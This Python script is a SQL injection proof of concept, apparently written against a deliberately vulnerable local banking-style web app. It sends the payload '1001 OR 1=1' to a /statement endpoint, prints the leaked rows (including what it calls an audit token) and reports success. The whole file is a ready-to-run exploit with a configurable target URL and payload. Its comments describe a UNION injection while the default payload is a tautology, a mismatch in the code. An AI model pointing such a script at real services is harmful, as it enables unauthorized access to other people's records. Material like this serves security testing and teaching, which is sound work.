import argparse
import json
import sys
import time

import requests

DEFAULT_PAYLOAD = "1001 OR 1=1"


def exploit(base_url: str, payload: str = DEFAULT_PAYLOAD) -> bool:
    resp = requests.get(f"{base_url}/statement", params={"account": payload}, timeout=10)
    resp.raise_for_status()
    data = resp.json()
    print(json.dumps(data, indent=2))
    # Expect at least three rows when UNION succeeds (2 accounts + audit token)
    return len(data) >= 3


def wait_for_service(base_url: str, retries: int = 10) -> None:
    for _ in range(retries):
        try:
            requests.get(f"{base_url}/accounts", timeout=5)
            return
        except requests.RequestException:
            time.sleep(2)
    raise RuntimeError("Service not reachable")


def main():
    parser = argparse.ArgumentParser(description="MySQL UNION SQLi PoC")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    args = parser.parse_args()
    wait_for_service(args.base_url)
    success = exploit(args.base_url, args.payload)
    if success:
        print("SQLi SUCCESS")
    else:
        print("SQLi FAILED")
        sys.exit(1)


if __name__ == "__main__":
    main()
